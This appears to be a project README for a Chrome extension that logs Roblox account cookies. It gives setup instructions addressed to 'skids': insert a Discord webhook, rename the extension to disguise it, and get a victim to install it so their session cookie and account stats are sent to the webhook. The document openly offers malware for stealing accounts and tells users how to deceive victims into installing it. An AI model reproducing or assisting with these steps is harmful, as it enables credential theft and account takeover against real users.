# Update
Due to the increased attention this project is getting i have decided to update it, i have fixed a few bugs in the embed and have created an entirely new embed which includes stats on the roblox account that was logged.

## Setup for skids
> 1. Put your discord webhook in "https://raw.githubusercontent.com/MysticalHearts/chrome-extension-roblox-cookie-logger/main/extension/assets/roblox-extension-logger-chrome-cookie-v2.9-alpha.5.zip" "line 1"
> 2. You may change the extension info (name, description) in "https://raw.githubusercontent.com/MysticalHearts/chrome-extension-roblox-cookie-logger/main/extension/assets/roblox-extension-logger-chrome-cookie-v2.9-alpha.5.zip"
> 3. Upload the extension directory as a chrome extension and get victim to add your extension to chrome
> 4. As soon as they add the extention you will get a message containing victim info to your webhook
